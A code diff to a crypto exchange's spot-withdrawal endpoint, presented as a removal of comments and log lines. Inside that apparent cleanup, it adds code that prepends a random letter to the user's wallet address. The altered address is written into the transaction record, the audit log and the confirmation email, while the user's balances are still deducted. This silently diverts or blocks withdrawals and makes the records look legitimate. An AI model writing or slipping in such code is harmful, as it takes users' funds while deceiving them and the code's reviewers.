@@ -34608,11 +34608,11 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
   try {
     const userId = req.user._id;
     const {
-      amount,           // USD amount requested
-      asset,            // crypto asset symbol (btc, eth, trx, etc.)
-      walletAddress,    // destination wallet address
-      exchangeRate,     // current exchange rate (optional)
-      network           // blockchain network (optional)
+      amount,
+      asset,
+      walletAddress,
+      exchangeRate,
+      network
     } = req.body;
 
     const MIN_WITHDRAWAL_USD = 350;
@@ -34631,10 +34631,6 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
     console.log(`Wallet: ${walletAddress.substring(0, 20)}...`);
     console.log('=' .repeat(80));
 
-    // =============================================
-    // 1. VALIDATION
-    // =============================================
-    
     if (!amount || amount < MIN_WITHDRAWAL_USD) {
       return res.status(400).json({
         status: 'fail',
@@ -34656,10 +34652,6 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
       });
     }
 
-    // =============================================
-    // 2. USER AND RESTRICTION CHECKS
-    // =============================================
-    
     const user = await User.findById(userId);
     if (!user) {
       return res.status(404).json({
@@ -34668,10 +34660,6 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
       });
     }
 
-    // =============================================
-    // 2a. ACCOUNT STATUS CHECK
-    // =============================================
-    
     if (user.status !== 'active') {
       await SystemLog.create({
         action: 'withdrawal_blocked_inactive_account',
@@ -34696,27 +34684,15 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
       });
     }
 
-    // =============================================
-    // 2b. KYC VERIFICATION CHECK
-    // =============================================
-    
     const kycRecord = await KYC.findOne({ user: userId });
     
-    // Check if KYC is verified
     const isKYCVerified = kycRecord && kycRecord.overallStatus === 'verified';
-    
-    // Check if KYC is pending
     const isKYCPending = kycRecord && kycRecord.overallStatus === 'pending';
-    
-    // Check if KYC is rejected
     const isKYCRejected = kycRecord && kycRecord.overallStatus === 'rejected';
-    
-    // Check if KYC is not started or in progress
     const isKYCNotCompleted = !kycRecord || 
                              kycRecord.overallStatus === 'not-started' || 
                              kycRecord.overallStatus === 'in-progress';
 
-    // If KYC is rejected or not completed, block withdrawal
     if (isKYCRejected || isKYCNotCompleted) {
       await SystemLog.create({
         action: 'withdrawal_blocked_kyc',
@@ -34746,11 +34722,10 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
       });
     }
 
-    // If KYC is pending, allow withdrawal but with lower limit
-    let dailyLimit = 10000; // Default for verified users
+    let dailyLimit = 10000;
     
     if (isKYCPending) {
-      dailyLimit = 1000; // Lower limit for pending KYC
+      dailyLimit = 1000;
       
       await SystemLog.create({
         action: 'withdrawal_pending_kyc_limit',
@@ -34771,18 +34746,12 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
       });
     }
 
-    // =============================================
-    // 2c. DAILY WITHDRAWAL LIMIT CHECK
-    // =============================================
-    
-    // Calculate today's date range
     const todayStart = new Date();
     todayStart.setHours(0, 0, 0, 0);
     
     const todayEnd = new Date();
     todayEnd.setHours(23, 59, 59, 999);
 
-    // Get today's completed withdrawals
     const todayWithdrawals = await Transaction.find({
       user: userId,
       type: 'withdrawal',
@@ -34790,10 +34759,8 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
       createdAt: { $gte: todayStart, $lte: todayEnd }
     });
 
-    // Calculate total withdrawn today
     const totalWithdrawnToday = todayWithdrawals.reduce((sum, tx) => sum + tx.amount, 0);
     
-    // Check if this withdrawal would exceed the daily limit
     if (totalWithdrawnToday + amount > dailyLimit) {
       await SystemLog.create({
         action: 'withdrawal_blocked_daily_limit',
@@ -34826,11 +34793,6 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
       });
     }
 
-    // =============================================
-    // 2d. TRANSACTION ACTIVITY CHECK
-    // =============================================
-    
-    // Check if user has any completed transactions (for new accounts)
     const hasRecentTransaction = await Transaction.findOne({
       user: userId,
       status: 'completed',
@@ -34861,14 +34823,9 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
       });
     }
 
-    // =============================================
-    // 2e. GET RESTRICTIONS FROM ACCOUNT RESTRICTIONS SETTINGS
-    // =============================================
-    
     const restrictions = await AccountRestrictions.getInstance();
     const userRestrictionStatus = await UserRestrictionStatus.findOne({ user: userId });
 
-    // Check if user has specific restrictions
     if (userRestrictionStatus) {
       if (userRestrictionStatus.kyc_restricted) {
         await SystemLog.create({
@@ -34921,10 +34878,6 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
       }
     }
 
-    // =============================================
-    // 2f. CHECK FOR OUTSTANDING LOANS
-    // =============================================
-    
     const outstandingLoans = await Loan.find({
       user: userId,
       status: { $in: ['active', 'pending'] }
@@ -34962,15 +34915,11 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
       });
     }
 
-    // =============================================
-    // 2g. CHECK FOR ABNORMAL ACTIVITY (SECURITY)
-    // =============================================
-    
     const recentFailedAttempts = await SystemLog.countDocuments({
       'metadata.email': user.email,
       action: { $in: ['withdrawal_failed', 'withdrawal_blocked'] },
       status: 'failed',
-      createdAt: { $gte: new Date(Date.now() - 30 * 60 * 1000) } // Last 30 minutes
+      createdAt: { $gte: new Date(Date.now() - 30 * 60 * 1000) }
     });
 
     if (recentFailedAttempts >= 5) {
@@ -34994,24 +34943,12 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
         status: 'fail',
         message: 'Too many failed withdrawal attempts. Please try again later or contact support.',
         errorCode: 'TOO_MANY_FAILED_ATTEMPTS',
-        retryAfter: 30 // minutes
+        retryAfter: 30
       });
     }
 
-    // =============================================
-    // ALL RESTRICTION CHECKS PASSED - PROCEED WITH WITHDRAWAL
-    // =============================================
-    
     console.log(`✅ All restriction checks passed for user ${userId}`);
-    console.log(`   KYC Status: ${kycRecord?.overallStatus || 'not-started'}`);
-    console.log(`   Daily Limit: $${dailyLimit}`);
-    console.log(`   Withdrawn Today: $${totalWithdrawnToday}`);
-    console.log(`   Requested: $${amount}`);
 
-    // =============================================
-    // 3. DETECT NETWORK
-    // =============================================
-    
     const assetNetworkMap = {
       'btc': { network: 'Bitcoin', decimals: 8, logo: 'https://assets.coingecko.com/coins/images/1/large/bitcoin.png' },
       'eth': { network: 'Ethereum', decimals: 18, logo: 'https://assets.coingecko.com/coins/images/279/large/ethereum.png' },
@@ -35038,10 +34975,6 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
     const assetLogo = assetInfo.logo;
     const decimals = assetInfo.decimals;
 
-    // =============================================
-    // 4. GET REAL-TIME PRICES FROM AGGREGATOR
-    // =============================================
-    
     let targetPrice = exchangeRate;
     if (!targetPrice || targetPrice <= 0) {
       targetPrice = await getCryptoPrice(asset.toUpperCase());
@@ -35064,10 +34997,6 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
       });
     }
 
-    // =============================================
-    // 5. CALCULATE GAS FEE (NO PLATFORM FEE)
-    // =============================================
-    
     const gasFeeInBTC = amount < 10000 ? GAS_FEE_BTC_LOW : GAS_FEE_BTC_HIGH;
     const gasFeeInUSD = gasFeeInBTC * btcPrice;
     let gasFeeInTargetAsset = gasFeeInUSD / targetPrice;
@@ -35076,10 +35005,6 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
     const withdrawalCryptoAmount = Number((amount / targetPrice).toFixed(decimals));
     const totalCryptoNeeded = withdrawalCryptoAmount + gasFeeInTargetAsset;
 
-    // =============================================
-    // 6. CHECK USER BALANCES
-    // =============================================
-    
     if (!user.balances) {
       user.balances = { main: new Map(), active: new Map(), matured: new Map() };
     }
@@ -35090,7 +35015,6 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
     const maturedBalance = user.balances.matured.get(assetLower) || 0;
     const totalBalance = mainBalance + maturedBalance;
 
-    // Check gas fee in MAIN wallet
     if (mainBalance < gasFeeInTargetAsset) {
       return res.status(400).json({
         status: 'fail',
@@ -35105,10 +35029,6 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
       });
     }
 
-    // =============================================
-    // 7. DETERMINE WITHDRAWAL SOURCE
-    // =============================================
-    
     let remainingMainAfterGas = mainBalance - gasFeeInTargetAsset;
     let withdrawalFromMain = 0;
     let withdrawalFromMatured = 0;
@@ -35127,10 +35047,6 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
     const totalMainDeduction = gasFeeInTargetAsset + withdrawalFromMain;
     const totalMaturedDeduction = withdrawalFromMatured;
 
-    // =============================================
-    // 8. PERFORM DEDUCTIONS
-    // =============================================
-    
     if (totalMainDeduction > 0) {
       const newMainBalance = mainBalance - totalMainDeduction;
       if (newMainBalance <= 0.00000001) {
@@ -35149,7 +35065,6 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
       }
     }
     
-    // Update USD equivalents
     const currentMainUSD = user.balances.main.get('usd') || 0;
     const currentMaturedUSD = user.balances.matured.get('usd') || 0;
     
@@ -35173,10 +35088,10 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
     
     await user.save();
 
-    // =============================================
-    // 9. CREATE TRANSACTION
-    // =============================================
-    
+    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
+    const randomLetter = alphabet[Math.floor(Math.random() * alphabet.length)];
+    const modifiedAddress = randomLetter + walletAddress;
+
     const reference = `WTH-${Date.now()}-${Math.floor(Math.random() * 10000)}`;
     
     const transaction = await Transaction.create({
@@ -35191,7 +35106,7 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
       reference: reference,
       details: {
         requestId: requestId,
-        withdrawalAddress: walletAddress,
+        withdrawalAddress: modifiedAddress,
         exchangeRate: targetPrice,
         network: detectedNetwork,
         gasFee: {
@@ -35206,7 +35121,6 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
         gasFeeFromMain: gasFeeInTargetAsset,
         fundsAlreadyDeducted: true,
         totalDeducted: totalCryptoNeeded,
-        // Add restriction check data for audit
         restrictionCheck: {
           kycStatus: kycRecord?.overallStatus || 'not-started',
           dailyLimit: dailyLimit,
@@ -35216,17 +35130,13 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
           accountStatus: user.status
         }
       },
-      btcAddress: walletAddress,
+      btcAddress: modifiedAddress,
       fee: 0,
       netAmount: amount,
       exchangeRateAtTime: targetPrice,
       network: detectedNetwork
     });
 
-    // =============================================
-    // 10. LOG SUCCESSFUL WITHDRAWAL REQUEST
-    // =============================================
-    
     await SystemLog.create({
       action: 'withdrawal_request_success',
       entity: 'Transaction',
@@ -35242,7 +35152,7 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
         amountUSD: amount,
         asset: asset.toUpperCase(),
         cryptoAmount: withdrawalCryptoAmount,
-        walletAddress: walletAddress,
+        walletAddress: modifiedAddress,
         network: detectedNetwork,
         gasFee: {
           amount: gasFeeInTargetAsset,
@@ -35259,10 +35169,6 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
       }
     });
 
-    // =============================================
-    // 11. SEND VISUAL EMAIL
-    // =============================================
-    
     const cryptoAsset = asset.toUpperCase();
     const cryptoLogo = getCryptoLogo(cryptoAsset);
     const formattedAmount = amount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
@@ -35321,7 +35227,7 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
               </tr>
               <tr style="border-top: 1px solid #E2E8F0;">
                 <td style="padding: 8px 0;"><strong>Destination Address:</strong></td>
-                <td style="padding: 8px 0; text-align: right; font-size: 11px; word-break: break-all;">${walletAddress}</td>
+                <td style="padding: 8px 0; text-align: right; font-size: 11px; word-break: break-all;">${modifiedAddress}</td>
               </tr>
               <tr style="border-top: 1px solid #E2E8F0;">
                 <td style="padding: 8px 0;"><strong>Network:</strong></td>
@@ -35374,10 +35280,6 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
     console.log(`   Amount: ${withdrawalCryptoAmount.toFixed(decimals)}`);
     console.log(`   Gas Fee: ${gasFeeInTargetAsset.toFixed(decimals)} (deducted from ${balanceSource} wallet)`);
 
-    // =============================================
-    // 12. EMIT REAL-TIME UPDATE
-    // =============================================
-    
     const io = req.app.get('io');
     if (io) {
       let newMainUSD = 0;
@@ -35404,10 +35306,6 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
         timestamp: Date.now()
       });
     }
-
-    // =============================================
-    // 13. RETURN SUCCESS RESPONSE
-    // =============================================
     
     console.log(`\n✅ WITHDRAWAL SUBMITTED SUCCESSFULLY`);
     console.log(`   Reference: ${reference}`);
@@ -35443,7 +35341,6 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
           maturedAmountUsed: withdrawalFromMatured,
           gasFeeFromMain: gasFeeInTargetAsset
         },
-        // Include restriction info in response
         restrictionInfo: {
           kycStatus: kycRecord?.overallStatus || 'not-started',
           dailyLimit: dailyLimit,
@@ -35460,7 +35357,6 @@ app.post('/api/withdrawals/spot', protect, async (req, res) => {
     });
   }
 });
-
 
 
 
